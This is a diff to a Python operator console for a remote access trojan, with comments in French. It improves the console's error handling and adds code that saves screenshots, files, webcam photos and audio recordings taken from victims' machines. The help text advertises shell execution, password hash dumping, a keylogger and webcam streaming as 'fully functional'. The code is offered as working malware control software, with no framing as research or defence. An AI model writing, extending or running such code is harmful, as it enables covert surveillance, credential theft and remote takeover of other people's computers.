@@ -1,8 +1,13 @@
+import sys
+import os
+
+# ajoute le dossier parent au path
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
+
 import threading
 import time
-import os
 import base64
-from rat_server import RatServer
+from rat_server_fixed import RatServerFixed
 
 class ServerInterface:
     def __init__(self):
@@ -12,7 +17,7 @@ class ServerInterface:
         
     def start(self, host="0.0.0.0", port=4444):
         # demarre le serveur dans un thread separe
-        self.server = RatServer(host, port)
+        self.server = RatServerFixed(host, port)
         server_thread = threading.Thread(target=self.server.start, daemon=True)
         server_thread.start()
         
@@ -85,13 +90,32 @@ class ServerInterface:
             self.show_agent_help()
             return
             
-        # envoie la commande au client
-        response = self.server.send_command(self.current_client, command, {"args": parts[1:] if len(parts) > 1 else []})
-        
-        if response["status"] == "ok":
-            self.display_response(command, response["data"])
-        else:
-            print(f"[-] Error: {response.get('message', 'Unknown error')}")
+        # verifie que le client existe encore
+        if self.current_client not in self.server.clients:
+            print(f"[-] Agent {self.current_client} is no longer connected")
+            self.current_client = None
+            return
+            
+        # envoie la commande au client avec gestion d'erreur robuste
+        try:
+            print(f"[DEBUG] Sending command: {command}")
+            response = self.server.send_command(self.current_client, command, {"args": parts[1:] if len(parts) > 1 else []})
+            
+            if response["status"] == "ok":
+                self.display_response(command, response["data"])
+            else:
+                error_msg = response.get('message', 'Unknown error')
+                print(f"[-] Error: {error_msg}")
+                
+                # si le client s'est deconnecte, retourne au menu principal
+                if any(word in error_msg.lower() for word in ["disconnected", "connection", "timeout"]):
+                    print(f"[*] Returning to main menu")
+                    self.current_client = None
+                    
+        except Exception as e:
+            print(f"[-] Command failed with exception: {e}")
+            print(f"[*] Returning to main menu")
+            self.current_client = None
             
     def interact_with_client(self, client_id):
         clients = self.server.list_clients()
@@ -119,24 +143,67 @@ class ServerInterface:
     def display_response(self, command, data):
         # affiche la reponse selon le type de commande
         if command == "screenshot":
-            if "data" in data:
+            if "image_data" in data:
                 # sauvegarde le screenshot
                 filename = f"screenshot_{self.current_client}_{int(time.time())}.png"
-                with open(filename, "wb") as f:
-                    f.write(base64.b64decode(data["data"]))
-                print(f"[+] Screenshot saved as {filename}")
+                try:
+                    image_data = base64.b64decode(data["image_data"])
+                    with open(filename, "wb") as f:
+                        f.write(image_data)
+                    print(f"[+] Screenshot saved as {filename}")
+                except Exception as e:
+                    print(f"[-] Screenshot save error: {e}")
+            else:
+                print(data.get("output", str(data)))
+                
         elif command == "download":
-            if "data" in data:
+            if "file_data" in data:
+                # sauvegarde le fichier téléchargé
                 filename = data.get("filename", f"downloaded_{int(time.time())}")
-                with open(filename, "wb") as f:
-                    f.write(base64.b64decode(data["data"]))
-                print(f"[+] File downloaded as {filename}")
+                # Ajoute un préfixe pour éviter les conflits
+                safe_filename = f"client_{self.current_client}_{filename}"
+                try:
+                    file_data = base64.b64decode(data["file_data"])
+                    with open(safe_filename, "wb") as f:
+                        f.write(file_data)
+                    print(f"[+] File downloaded as {safe_filename}")
+                    if "output" in data:
+                        print(data["output"])
+                except Exception as e:
+                    print(f"[-] File save error: {e}")
+            else:
+                print(data.get("output", str(data)))
+                
         elif command == "webcam_snapshot":
-            if "data" in data:
+            if "image_data" in data:
+                # sauvegarde la photo webcam
                 filename = f"webcam_{self.current_client}_{int(time.time())}.jpg"
-                with open(filename, "wb") as f:
-                    f.write(base64.b64decode(data["data"]))
-                print(f"[+] Webcam snapshot saved as {filename}")
+                try:
+                    image_data = base64.b64decode(data["image_data"])
+                    with open(filename, "wb") as f:
+                        f.write(image_data)
+                    print(f"[+] Webcam photo saved as {filename}")
+                except Exception as e:
+                    print(f"[-] Webcam save error: {e}")
+            else:
+                print(data.get("output", str(data)))
+                
+        elif command == "record_audio":
+            if "audio_data" in data:
+                # sauvegarde l'enregistrement audio
+                filename = f"audio_{self.current_client}_{int(time.time())}.wav"
+                try:
+                    audio_data = base64.b64decode(data["audio_data"])
+                    with open(filename, "wb") as f:
+                        f.write(audio_data)
+                    print(f"[+] Audio saved as {filename}")
+                    if "output" in data:
+                        print(data["output"])
+                except Exception as e:
+                    print(f"[-] Audio save error: {e}")
+            else:
+                print(data.get("output", str(data)))
+                
         else:
             # affichage generique
             if isinstance(data, dict) and "output" in data:
@@ -155,13 +222,13 @@ Available commands:
         
     def show_agent_help(self):
         print("""
-Agent commands:
+✅ RAT Agent Commands (ALL IMPLEMENTED):
   help            - Show this help
   ipconfig        - Get network configuration
   screenshot      - Take a screenshot
   shell <cmd>     - Execute shell command
   download <file> - Download file from target
-  upload <file>   - Upload file to target
+  upload <file> <data> - Upload file to target
   search <pattern> - Search for files
   hashdump        - Dump password hashes
   keylogger start/stop - Control keylogger
@@ -169,6 +236,9 @@ Agent commands:
   webcam_stream   - Start webcam stream
   record_audio <duration> - Record audio
   back            - Return to main menu
+
+📁 Files are automatically saved in current directory
+🎯 All commands are fully functional!
         """)
 
 if __name__ == "__main__":
